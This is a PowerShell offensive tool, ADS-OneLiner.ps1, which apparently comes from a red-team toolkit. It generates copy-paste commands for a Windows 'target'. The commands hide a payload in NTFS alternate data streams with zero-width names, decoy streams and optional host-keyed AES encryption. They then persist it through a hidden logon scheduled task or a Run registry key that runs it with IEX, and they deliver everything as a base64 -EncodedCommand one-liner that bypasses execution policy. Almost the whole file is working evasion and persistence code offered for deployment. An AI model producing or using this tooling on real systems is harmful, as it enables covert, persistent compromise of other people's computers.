<#
.SYNOPSIS
    ADS-OneLiner.ps1 - Minimal Command Generator for Windows Targets

.DESCRIPTION
    Runs on Linux (Kali) to generate minimal PowerShell commands for Windows deployment.
    Calls ADS-Dropper.ps1 internally to compute configuration, then outputs only the
    essential commands needed on the Windows target.

    NO full script upload needed - just copy/paste the generated commands.

.PARAMETER Payload
    Payload content (required unless -PayloadAtDeployment)

.PARAMETER PayloadAtDeployment
    Prompt for payload on Windows target instead of baking it in

.PARAMETER ZeroWidthStreams
    Enable zero-width Unicode stream names

.PARAMETER ZeroWidthMode
    'single', 'multi', or 'hybrid'

.PARAMETER HybridPrefix
    Prefix for hybrid mode (e.g., 'Zone.Identifier')

.PARAMETER Persist
    'task', 'registry', 'wmi', or 'none'

.PARAMETER CreateDecoys
    Number of decoy streams (0-10)

.PARAMETER Encrypt
    Enable AES-256 encryption

.PARAMETER Randomize
    Randomize host file name

.PARAMETER OutputFile
    Where to save generated commands (default: ads-payload.txt)

.PARAMETER ManifestDir
    Manifest directory on Linux (default: ./manifests)

.EXAMPLE
    pwsh ADS-OneLiner.ps1 \
      -Payload "Write-Host 'Test'" \
      -ZeroWidthStreams \
      -Persist task

.NOTES
    Author: Qweary
    Version: 2.0.0 (Command Generator)
    Requires: ADS-Dropper.ps1 in ./src/ or same directory
#>

[CmdletBinding()]
param(
    [string]$Payload,
    [switch]$PayloadAtDeployment,
    
    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [switch]$Encrypt,
    [switch]$Randomize,
    
    [string]$OutputFile = "ads-payload.txt",
    [string]$ManifestDir = "./manifests"
)

Write-Host "`n╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ ADS Minimal Command Generator                         ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

# Validate payload input
if (-not $Payload -and -not $PayloadAtDeployment) {
    Write-Error "Provide -Payload or use -PayloadAtDeployment"
    exit 1
}

# Locate ADS-Dropper.ps1
$possiblePaths = @(
    (Join-Path $PSScriptRoot 'ADS-Dropper.ps1')
    (Join-Path $PSScriptRoot 'src/ADS-Dropper.ps1')
    './ADS-Dropper.ps1'
    './src/ADS-Dropper.ps1'
)

$adsDropperPath = $null
foreach ($path in $possiblePaths) {
    if (Test-Path $path) {
        $adsDropperPath = $path
        break
    }
}

if (-not $adsDropperPath) {
    Write-Error "ADS-Dropper.ps1 not found. Searched: $($possiblePaths -join ', ')"
    exit 1
}

Write-Host "[*] Using ADS-Dropper: $adsDropperPath" -ForegroundColor Gray

# Call ADS-Dropper.ps1 in GenerateOnly mode to get configuration
Write-Host "[*] Generating configuration..." -ForegroundColor White

$params = @{
    Payload = if ($PayloadAtDeployment) { "PLACEHOLDER" } else { $Payload }
    ZeroWidthStreams = $ZeroWidthStreams
    ZeroWidthMode = $ZeroWidthMode
    Persist = $Persist
    Randomize = $Randomize
    Encrypt = $Encrypt
    CreateDecoys = $CreateDecoys
    GenerateOnly = $true
}

if ($HybridPrefix) { $params.HybridPrefix = $HybridPrefix }

try {
    $config = & $adsDropperPath @params
} catch {
    Write-Error "Failed to generate configuration: $_"
    exit 1
}

Write-Host "[+] Configuration computed" -ForegroundColor Green
Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
Write-Host "    Stream: $($config.StreamNameEscaped)" -ForegroundColor Gray
Write-Host "    Task: $($config.TaskName)" -ForegroundColor Gray

# Build minimal Windows commands
Write-Host "[*] Building minimal deployment commands..." -ForegroundColor White

# Helper functions needed on Windows (minimal versions)
$helperFunctions = @'
# Host-derived AES key function
function Get-HostKey {
    $h = @($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber) -join '|'
    [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))
}

# Encrypt function (compact)
function Enc($t,$k) {
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.GenerateIV()
    $e=$a.CreateEncryptor()
    $p=[Text.Encoding]::UTF8.GetBytes($t)
    $b=$e.TransformFinalBlock($p,0,$p.Length)
    [Convert]::ToBase64String($a.IV+$b)
}

# Decrypt function (compact)
function Dec($d,$k) {
    $b=[Convert]::FromBase64String($d)
    $a=[Security.Cryptography.Aes]::Create()
    $a.Key=$k;$a.IV=$b[0..15]
    $c=$a.CreateDecryptor()
    $t=$b[16..($b.Length-1)]
    $p=$c.TransformFinalBlock($t,0,$t.Length)
    [Text.Encoding]::UTF8.GetString($p)
}

'@

# Start building the minimal command script
$minimalScript = ""

# Add helper functions only if encryption is enabled
if ($Encrypt) {
    $minimalScript += $helperFunctions + "`n"
}

# Configuration variables
$minimalScript += @"
# Configuration
`$hp='$($config.HostPath)'
`$sn=$($config.StreamNameEscaped)
`$tn='$($config.TaskName)'

"@

# Payload handling
if ($PayloadAtDeployment) {
    $minimalScript += @"
# Payload input
Write-Host 'Enter payload (press Enter twice when done):' -ForegroundColor Cyan
`$lines=@()
do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
`$pl=`$lines-join"`n"

"@
} else {
    # Escape the payload for embedding
    $escapedPayload = $Payload -replace "'","''" -replace '`','``'
    $minimalScript += @"
# Payload
`$pl='$escapedPayload'

"@
}

# Encryption handling
if ($Encrypt) {
    $minimalScript += @"
# Encrypt payload
`$k=Get-HostKey
`$pl=Enc `$pl `$k

"@
}

# Create host file and write ADS
$minimalScript += @"
# Create ADS
if(!(Test-Path `$hp)){ni `$hp -ItemType File -Force|Out-Null}
`$pl|sc "`$hp``:`$sn" -Force

"@

# Create decoys
if ($CreateDecoys -gt 0) {
    $decoyNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
    $decoyContents = @('[ZoneTransfer]`r`nZoneId=3', 'Document summary', 'Internal use only', 'System')
    
    for ($i = 0; $i -lt [Math]::Min($CreateDecoys, $decoyNames.Count); $i++) {
        $decoyContent = $decoyContents[$i]
        $minimalScript += "'$decoyContent'|sc `"`$hp`:$($decoyNames[$i])`" -Force`n"
    }
    $minimalScript += "`n"
}

# Persistence
if ($Persist -eq 'task') {
    if ($Encrypt) {
        # Encrypted task
        $minimalScript += @"
# Scheduled task (encrypted, PS2.0 compatible)
`$adsPath=`$hp+':'+`$sn
`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e='''';gc '''+`$adsPath+'''|%{`$e+=`$_+[char]10};`$p=Dec `$e `$k;IEX `$p'
`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$taskCmd`""
`$t=New-ScheduledTaskTrigger -AtLogOn
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null

"@
    } else {
        # Unencrypted task
        $minimalScript += @"
# Scheduled task
`$adsPath=`$hp+':'+`$sn
`$cmd="`$c='';gc '`$adsPath'|%{`$c+=`$_+[char]10};IEX `$c"
`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$cmd`""
`$t=New-ScheduledTaskTrigger -AtLogOn
`$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null

"@
    }
} elseif ($Persist -eq 'registry') {
    $minimalScript += @"
# Registry persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""

"@
}

# Final output message
if (-not $PayloadAtDeployment) {
    $minimalScript += @"
# Execute payload immediately
IEX `$pl

"@
}

$minimalScript += @"
Write-Host '[+] Deployment complete' -ForegroundColor Green
"@

# Base64 encode for one-liner
Write-Host "[*] Encoding for transport..." -ForegroundColor White
$bytes = [System.Text.Encoding]::Unicode.GetBytes($minimalScript)
$encoded = [Convert]::ToBase64String($bytes)

# Save manifest on Linux
if (-not $PayloadAtDeployment) {
    Write-Host "[*] Saving manifest..." -ForegroundColor White
    
    if (-not (Test-Path $ManifestDir)) {
        New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
    
    $payloadHash = (Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
    
    $manifest = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        StreamNameEscaped = $config.StreamNameEscaped
        Codepoints = $config.Codepoints
        TaskName = $config.TaskName
        ZeroWidthMode = $ZeroWidthMode
        Persistence = $Persist
        Encrypted = $Encrypt.IsPresent
        DecoysCount = $CreateDecoys
        Randomized = $Randomize.IsPresent
        PayloadHash = $payloadHash
        Operator = $env:USER
        GeneratedOn = hostname
        OutputFile = $OutputFile
    }
    
    $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
    Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
}

# Generate output file
Write-Host "[*] Generating output formats..." -ForegroundColor White

$outputContent = @"
╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Deployment Commands                          ║
║ Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')                         ║
╚═══════════════════════════════════════════════════════════╝

CONFIGURATION:
  Host File: $($config.HostPath)
  Stream Name: $(if($ZeroWidthStreams){'<zero-width> (' + $config.Codepoints + ')'}else{$config.StreamName})
  Task Name: $($config.TaskName)
  Zero-Width Mode: $ZeroWidthMode
  Persistence: $Persist
  Decoys: $CreateDecoys
  Encryption: $($Encrypt.IsPresent)
  Randomized: $($Randomize.IsPresent)
  
PAYLOAD SIZE:
  Readable: $($minimalScript.Length) characters
  Encoded: $($encoded.Length) characters

╔═══════════════════════════════════════════════════════════╗
║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
╚═══════════════════════════════════════════════════════════╝

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded

╔═══════════════════════════════════════════════════════════╗
║ OPTION 2: Readable Multi-Line Commands                   ║
╚═══════════════════════════════════════════════════════════╝

$minimalScript

╔═══════════════════════════════════════════════════════════╗
║ USAGE                                                     ║
╚═══════════════════════════════════════════════════════════╝

1. Copy OPTION 1 or OPTION 2
2. Paste into PowerShell on Windows target
3. Press Enter
$(if ($PayloadAtDeployment) { "4. Enter payload when prompted`n5. Press Enter twice to finish" })

╔═══════════════════════════════════════════════════════════╗
║ CLEANUP (use codepoints from manifest)                   ║
╚═══════════════════════════════════════════════════════════╝

# Reconstruct stream name
`$sn=$($config.StreamNameEscaped)

# Remove ADS
Remove-Item "`$(`$hp)``:`$sn" -Force

# Remove task
Unregister-ScheduledTask -TaskName '$($config.TaskName)' -Confirm:`$false

# Remove host file
Remove-Item '$($config.HostPath)' -Force

╔═══════════════════════════════════════════════════════════╗
"@

$outputContent | Out-File -FilePath $OutputFile -Encoding UTF8 -Force

Write-Host ""
Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║ SUMMARY                                                   ║" -ForegroundColor Cyan
Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "✓ Minimal commands generated" -ForegroundColor Green
Write-Host "✓ Output saved to: $OutputFile" -ForegroundColor Green
if (-not $PayloadAtDeployment) {
    Write-Host "✓ Manifest saved for recovery" -ForegroundColor Green
}
Write-Host ""
Write-Host "READY TO DEPLOY!" -ForegroundColor Magenta
Write-Host "Copy-paste to Windows target and execute.`n" -ForegroundColor White
